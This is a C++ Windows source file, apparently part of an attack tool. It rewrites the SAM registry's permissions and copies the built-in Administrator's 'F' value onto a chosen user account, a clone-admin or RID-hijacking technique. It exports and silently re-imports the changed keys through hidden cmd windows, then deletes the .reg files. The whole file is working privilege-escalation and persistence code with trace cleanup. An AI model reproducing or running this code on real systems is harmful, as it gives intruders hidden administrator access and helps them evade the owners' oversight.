#include "stdafx.h"
#include "ModReg.h"
#include <aclapi.h>


ModReg::ModReg(){
}

//Test OK
BOOL ModReg::ModRegAut(VOID) {
	//获取SAM的DACL(任意访问控制列表)

	DWORD dwRet;
	WCHAR *SAM = L"MACHINE\\SAM\\SAM";
	PSECURITY_DESCRIPTOR PSD = NULL;
	PACL POldDacl = NULL;
	PACL PNewDacl = NULL;

	EXPLICIT_ACCESS EA;
	HKEY hKey = NULL;

	dwRet = GetNamedSecurityInfo(
		SAM,
		SE_REGISTRY_KEY,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, &POldDacl, NULL, &PSD
	);

	if (dwRet != ERROR_SUCCESS) {
		//printf("get %x", dwRet);
		return FALSE;
	}

	//构建新的ACL，使Adminstrator能够拥有全部权限, 这里不需要继承
	ZeroMemory(&EA, sizeof(EA));
	BuildExplicitAccessWithName(
		&EA, L"Administrators", KEY_ALL_ACCESS, SET_ACCESS,
		CONTAINER_INHERIT_ACE//SUB_CONTAINERS_AND_OBJECTS_INHERIT
	);

	//添加新的ACL到DACL
	dwRet = SetEntriesInAcl(
		1, &EA, POldDacl, &PNewDacl
	);
	if (dwRet != ERROR_SUCCESS) {
		//printf("set %x", dwRet);
		return FALSE;
	}

	//更新SAM的DACL
	dwRet = SetNamedSecurityInfo(
		SAM,
		SE_REGISTRY_KEY,
		DACL_SECURITY_INFORMATION,
		NULL, NULL, PNewDacl, NULL
	);
	if (dwRet != ERROR_SUCCESS) {
		//printf("set new %x", dwRet);
		return FALSE;
	}


	//printf("successfully!");
	return TRUE;
}

BOOL ModReg::ModRegCon(CHAR *username) {
	DWORD dwRet;
	//get Administrator F value and write it to our user F
	HKEY AdHkey;
	DWORD AdDwType;
	UCHAR  *AdBuf = NULL;
	CHAR  AdSubKey[256];
	DWORD size = 256;
	
	//get current directory
	CHAR CurDir[MAX_PATH];
	memset(CurDir, 0, MAX_PATH);
	GetCurrentDirectoryA(MAX_PATH, CurDir);

	//get Administrator type value(default value)
	dwRet = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		"SAM\\SAM\\Domains\\Account\\Users\\Names\\Administrator",
		0,
		KEY_READ | KEY_QUERY_VALUE,
		&AdHkey
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}
	dwRet = RegQueryValueExA(
		AdHkey,
		NULL,
		NULL,
		&AdDwType,
		AdBuf,
		&size
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}

	//get Administrator F value
	memset(AdSubKey, 0, 256);
	CHAR AdTypeBuf[256];
	lstrcatA(AdSubKey, "SAM\\SAM\\Domains\\Account\\Users\\");
	sprintf(AdTypeBuf, "%08X\\", AdDwType);
	lstrcatA(AdSubKey, AdTypeBuf);
	dwRet = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		AdSubKey,
		0,
		KEY_READ | KEY_ALL_ACCESS,
		&AdHkey
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}

	//first we should make lpdata = NULL, then it will returen the certain size
	//then we malloc a size buffer to receive the data, it will succeed or you 
	//will get a ERROR_CODE 234---More Data Is Avaiable;here is OK
	dwRet = RegQueryValueExA(
		AdHkey,
		"F",
		NULL,
		&AdDwType,
		NULL,
		&size
	);
	if (dwRet != ERROR_SUCCESS && size <= 0) {
		return FALSE;
	}

	AdBuf = (UCHAR *)malloc(size);
	dwRet = RegQueryValueExA(
		AdHkey,
		"F",
		NULL,
		&AdDwType,
		AdBuf,
		&size
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}

	//user part
	//then we need change the F value of the user who we point,
	//then store it
	HKEY UsHkey;
	UCHAR *UsBuf=NULL;
	DWORD UsDwType;
	DWORD Ussize = 256;
	CHAR  UsSubKey[256];
	
	memset(UsSubKey, 0, 256);
	lstrcatA(UsSubKey, "SAM\\SAM\\Domains\\Account\\Users\\Names\\");
	lstrcatA(UsSubKey, username);

	//get user type value
	dwRet = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		UsSubKey,
		0,
		KEY_READ | KEY_QUERY_VALUE,
		&UsHkey
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}
	
	dwRet = RegQueryValueExA(
		UsHkey,
		NULL,
		NULL,
		&UsDwType,
		UsBuf,
		&Ussize
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}

	//change User F value
	memset(UsSubKey, 0, 256);
	CHAR  UsTypeBuf[256];
	lstrcatA(UsSubKey, "SAM\\SAM\\Domains\\Account\\Users\\");
	sprintf(UsTypeBuf, "%08X\\", UsDwType);
	lstrcatA(UsSubKey, UsTypeBuf);
	dwRet = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		UsSubKey,
		0,
		KEY_READ | KEY_ALL_ACCESS,
		&UsHkey
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}
	//change the user F value
	dwRet = RegSetValueExA(
		UsHkey,
		"F",
		0,
		REG_BINARY,
		AdBuf,
		size
	);
	if (dwRet != ERROR_SUCCESS) {
		return FALSE;
	}

	//export the change registry
	HINSTANCE ret;
	CHAR command[256];
	memset(command, 0, 256);
	lstrcatA(command, "/c reg.exe export HKEY_LOCAL_MACHINE\\");
	lstrcatA(command, "SAM\\SAM\\Domains\\Account\\Users\\Names\\");
	lstrcatA(command, username);
	lstrcatA(command, " ");
	lstrcatA(command, CurDir);
	lstrcatA(command, "\\usertype.reg");
	ret = ShellExecuteA(
		NULL,
		"open",
		"cmd",
		command,
		CurDir,
		SW_HIDE
	);
	

	memset(command, 0, 256);
	lstrcatA(command, "/c reg.exe export HKEY_LOCAL_MACHINE\\");
	lstrcatA(command, UsSubKey);
	lstrcatA(command, " ");
	lstrcatA(command, CurDir);
	lstrcatA(command, "\\changevalue.reg");

	ret = ShellExecuteA(
		NULL,
		"open",
		"cmd",
		command,
		CurDir,
		SW_HIDE
	);

	free(AdBuf);

	return TRUE;
}

BOOL ModReg::ModRegRec(VOID) {
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		"/c regedit /s usertype.reg",
		"./",
		SW_HIDE
	);
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		"/c regedit /s changevalue.reg",
		"./",
		SW_HIDE
	);

	//delte the reg file
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		"/c del  usertype.reg",
		"./",
		SW_HIDE
	);
	ShellExecuteA(
		NULL,
		"open",
		"cmd",
		"/c del  changevalue.reg",
		"./",
		SW_HIDE
	);

	return TRUE;
}

ModReg::~ModReg(){
}
